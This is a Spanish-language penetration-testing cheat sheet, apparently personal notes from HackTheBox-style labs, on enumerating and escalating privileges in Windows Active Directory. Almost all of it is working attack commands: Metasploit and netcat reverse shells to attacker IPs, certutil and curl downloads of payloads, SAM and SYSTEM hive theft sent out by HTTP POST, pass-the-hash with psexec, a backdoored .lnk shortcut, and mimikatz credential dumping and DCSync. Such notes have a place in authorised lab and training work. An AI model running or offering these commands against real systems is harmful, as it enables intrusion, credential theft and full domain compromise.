---
{"-publish":true,"permalink":"/penetration-tester-path/active-directory/","PassFrontmatter":true}
---


Active Directory (AD) es un servicio de directorio para su uso en un entorno Windows Server. Se trata de una estructura de base de datos distribuida y jerárquica que comparte información de infraestructura para localizar, proteger, administrar y organizar los recursos del equipo y de la red, como archivos, usuarios, grupos, periféricos y dispositivos de red.


## Enumeration

- Crackmapexec:

``` sh
crackmapexec smb 192.168.xx.xx -u . -p '' \
--pass-pol --shares --computers \ --groups --local-groups --rid-brute
```

- Remote Desktop (RDP):

``` javascript
xfreerdp /u:'xxxx' /p:'xxxx' /v:'192.168.xx.xx' /tls-seclevel:0
```

--- 

## Privilege Escalation

- Metasploit:

``` javascript
[*] Start 'hta_server' for reverse shell
rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST 10.10.16.13; set SRVHOST 10.10.16.13; run"

[*] Started reverse TCP handler on 10.10.16.13:4444 
[*] Using URL: http://10.10.16.13:8080/nZzLAD.hta
[*] Server started.

[*] Run on Windows machine
mshta.exe http://10.10.16.13:8080/nZzLAD.hta

[*] Meterpreter
sessions -i
sessions -i 1,2,3 etc

[*] Escalate with 'getsystem'
meterpreter > getsystem
```

- RunAsCs.exe:

``` javascript
.\runascs.exe sql_svc WqSZAF6CysDQbGb3 --logon-type 5 -b "cmd /c whoami /priv"
```

- GodPotato (SeImpersonatePrivilege):

``` javascript
certutil -urlcache -f http://10.10.16.10:8088/nc.exe C:\programdata\nc.exe
certutil -urlcache -f http://10.10.16.10:8088/GodPotato-NET4.exe C:\programdata\GodPotato-NET4.exe
C:\programdata\GodPotato-NET4 -cmd "C:\programdata\nc.exe -e cmd.exe 10.10.16.10 4446"
```

- robocopy (SeBackupPrivilege):

``` javascript
robocopy /b \Users\Administrator\Desktop .
```

- impacket-secretsdump (SAM Local):

``` javascript
[*] From Windows victim
powershell -c reg save HKLM\SYSTEM SYSTEM.SAV
powershell -c reg save HKLM\SAM SAM.SAV
powershell -c compress-archive *.SAV SAM.zip
powershell -c iwr http://xxxx:xxxx -Method POST -InFile SAM.zip

[*] From Linux attacker
unzip -o SAM.zip
impacket-secretsdump \
LOCAL -sam SAM.SAV -system SYSTEM.SAV
```

- impacket-psexec (shell login):

``` javascript
[*] Using password:
impacket-psexec Administrator@xxxxxxxxxxx.xxx cmd.exe

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password: xxxxxxxxxx

[*] Using hash
impacket-psexec Administrator@htb.local cmd.exe -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'
```

- link files .lnk:

``` javascript
[*] upload nc.exe to the remote machine
curl xxxxxxxxxx:xxxx/nc.exe -O

[*] inject reverse shell
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\Common Applications\Notepad.lnk');$s.TargetPath='C:\Windows\System32\cmd.exe';$s.Arguments='/c \"C:\ProgramData\nc.exe xxxxxxxxxx xxxx -e cmd\"';$s.Save()"
```

---

### Tools:

- rubeus.exe

Rubeus es un kit de herramientas en C diseñado para la interacción y el abuso de Kerberos. Permite a los atacantes realizar diversos ataques basados ​​en Active Directory, como la extracción, falsificación y manipulación de tickets Kerberos.
``` javascript
curl xxxxxxxxxx:xxxx/rubeus.exe -O
.\rubeus.exe dump /nowrap
```

- rubeustoccache.py:

`rubeusTocCache.py` es un **script en Python** no oficial que sirve para **convertir tickets Kerberos (TGT o TGS)** generados por la herramienta **Rubeus** (Windows) al **formato `ccache`**
``` python
python3 rubeustoccache.py 'BASE64==' admin admin;export KRB5CCNAME=admin
```

- mimikatz.exe:
es una **herramienta de post-explotación** extremadamente poderosa, usada principalmente por **red teamers, pentesters y atacantes** para manipular, extraer o abusar de credenciales en sistemas Windows. 
``` javascript
curl xxxxxxxxxx:xxxx/mimikatz.exe -O
.\mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
.\mimikatz.exe "lsadump::dcsync /domain:xxxxxxxxxx.htb /user:Administrator" exit
```

- powerview.ps1:

PowerView es una herramienta PowerShell para obtener conciencia situacional de red en los dominios de Windows. Contiene un conjunto de reemplazos de Pure-Powershell para varios comandos "netos" de Windows, que utilizan ganchos AD PowerShell y funciones de API WIN32 subyacentes para realizar una funcionalidad útil de dominio de Windows.
``` sh
curl xxxxxxxxxx:xxxx/powerview.ps1 -O
powershell Import-Module .\powerview.ps1
Get-NetDomain
Get-LocalUser
Set-DomainObject -Identity USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET
```


- certutil:

``` javascript
[*] dump to get 'Config:'
certutil -dump

CA Server: DC01.mist.htb
CA Name: mist-DC01-CA
Config: DC01.mist.htb\mist-DC01-CA
```


